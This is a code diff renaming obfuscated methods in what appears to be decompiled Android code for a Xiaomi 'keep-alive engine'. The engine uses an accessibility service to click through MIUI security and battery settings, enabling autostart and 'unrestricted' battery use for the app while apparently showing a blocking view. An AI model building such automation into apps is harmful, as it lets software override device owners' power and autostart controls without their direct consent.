@@ -30,7 +30,7 @@ import java.util.concurrent.locks.ReentrantLock;
  * 小米/Redmi/POCO 保活引擎。
  *
  * ADAPT: Field 'r' shadows class o.r; use KEEP_ALIVE_* constants.
- * ADAPT: Field 'c' (String) shadows class o.c; use W() directly (inherited) or EngineHelper.
+ * ADAPT: Field 'c' (String) shadows class o.c; use notifyPrepareConfirmLock() directly (inherited) or EngineHelper.
  * ADAPT: Class o.z shadows package o.z; use FilterHelper for CombineScrollCondition construction.
  *
  * vendor 原始路径: o/q.java
@@ -111,7 +111,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
 
     public static LinkedList l0() {
         LinkedList list = new LinkedList();
-        list.add(J());
+        list.add(buildBatteryDialogListenWindow());
         list.add(e0());
 
         ListenWindow lw3 = new ListenWindow("com.miui.powerkeeper",
@@ -174,7 +174,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
         ListenWindow lw = new ListenWindow("com.miui.securitycenter", "android.widget.FrameLayout");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(H(appName));
+        lw.getMatchs().add(buildTextContainsFilter(appName));
         return lw;
     }
 
@@ -183,7 +183,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
                 "com.miui.appmanager.ApplicationsDetailsActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(H(appName));
+        lw.getMatchs().add(buildTextContainsFilter(appName));
         return lw;
     }
 
@@ -192,7 +192,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
                 "com.miui.appmanager.AppManagerMainActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
-        lw.getMatchs().add(H(appName));
+        lw.getMatchs().add(buildTextContainsFilter(appName));
         return lw;
     }
 
@@ -217,10 +217,10 @@ public final class XiaomiEngine extends KeepAliveEngine {
         ReentrantLock lock = super.o;
         if (lock.tryLock()) {
             try {
-                if (!this.T()) {
+                if (!this.isEngineFinished()) {
                     Log.d("o.q", "准备结束本地保活自动化引擎");
                     com.guard.wallet.helper.BlockViewManager.h(100);
-                    this.X();
+                    this.markEngineRunning();
                     if (MyAccessibilityService.P() != null) {
                         MyAccessibilityService.P().x();
                     }
@@ -239,7 +239,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
                     }
                     com.guard.wallet.helper.BlockViewManager.c();
                     Log.d("o.q", "已结束本地保活自动化引擎");
-                    W(); // ADAPT: inherited static from o.c
+                    notifyPrepareConfirmLock(); // ADAPT: inherited static from o.c
                     this.d();
                 }
             } catch (Exception ex) {
@@ -252,7 +252,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
     public final void c0() {
         try {
             com.guard.wallet.helper.BlockViewManager.h(10);
-            UiObject scrollView = this.Q();
+            UiObject scrollView = this.findScrollableContainer();
             UiObject found;
             if (scrollView != null) {
                 scrollView.scrollForwardEnd();
@@ -271,7 +271,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
             if (found != null) {
                 Log.d("o.q", "耗电策略查找成功:" + found);
                 com.guard.wallet.helper.BlockViewManager.h(20);
-                UiObject clickable = found.findParentUtilCombine(L());
+                UiObject clickable = found.findParentUtilCombine(buildClickableNodeFilter());
                 if (clickable != null && clickable.click()) {
                     Log.d("o.q", "已点击电量消耗、耗电策略栏目:" + clickable);
                     com.guard.wallet.helper.BlockViewManager.h(30);
@@ -341,31 +341,31 @@ public final class XiaomiEngine extends KeepAliveEngine {
 
     public final boolean i0(String appLabel) {
         try {
-            UiObject scrollView = this.Q();
+            UiObject scrollView = this.findScrollableContainer();
             if (scrollView == null) {
                 this.r0();
-                scrollView = this.Q();
+                scrollView = this.findScrollableContainer();
             }
             UiObject found;
             if (scrollView != null) {
                 Log.d("o.q", "自启动管理滚动视图查找成功");
                 // ADAPT: o.z shadows — use FilterHelper for CombineScrollCondition
-                found = FilterHelper.scrollForwardUtil(scrollView, H(appLabel), 0, 0);
+                found = FilterHelper.scrollForwardUtil(scrollView, buildTextContainsFilter(appLabel), 0, 0);
                 if (found == null) {
-                    found = FilterHelper.scrollBackwardUtilFilter(scrollView, H(appLabel));
+                    found = FilterHelper.scrollBackwardUtilFilter(scrollView, buildTextContainsFilter(appLabel));
                 }
             } else {
                 Log.e("o.q", "自启动管理滚动视图查找失败");
-                found = this.k().findOneByCombine(H(appLabel));
+                found = this.k().findOneByCombine(buildTextContainsFilter(appLabel));
             }
             if (found == null) {
                 return false;
             }
-            UiObject clickableParent = found.findParentUtilCombine(L());
+            UiObject clickableParent = found.findParentUtilCombine(buildClickableNodeFilter());
             String errMsg;
             if (clickableParent != null) {
                 Log.d("o.q", "自启动栏目查找成功");
-                CheckedResult result = this.O(clickableParent, 5);
+                CheckedResult result = this.toggleSwitchOrCheckBox(clickableParent, 5);
                 if (result.isClicked() || result.isChecked()) {
                     Log.d("o.q", "已点击，已勾选App自启动");
                     return true;
@@ -445,7 +445,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
             com.guard.wallet.helper.BlockViewManager.h(40);
             this.G();
             Log.d("o.q", "active root complete");
-            UiObject scrollView = this.Q();
+            UiObject scrollView = this.findScrollableContainer();
 
             // Build OR filter for "unrestricted" text (text or desc)
             CombineFiltersWithOr orFilter = new CombineFiltersWithOr();
@@ -496,7 +496,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
                 } else {
                     found.click();
                     com.guard.wallet.utils.SystemHelper.T0(5);
-                    UiObject clickableParent = found.findParentUtilCombine(L());
+                    UiObject clickableParent = found.findParentUtilCombine(buildClickableNodeFilter());
                     if (clickableParent != null && clickableParent.click()) {
                         Log.d("o.q", "已勾选无限制,不采取任何限制措施");
                     }
@@ -585,7 +585,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
     @Override
     public final void u(AccessibilityEvent event, String pkg, String cls) {
         try {
-            if (this.T()) {
+            if (this.isEngineFinished()) {
                 return;
             }
             if (event != null) {
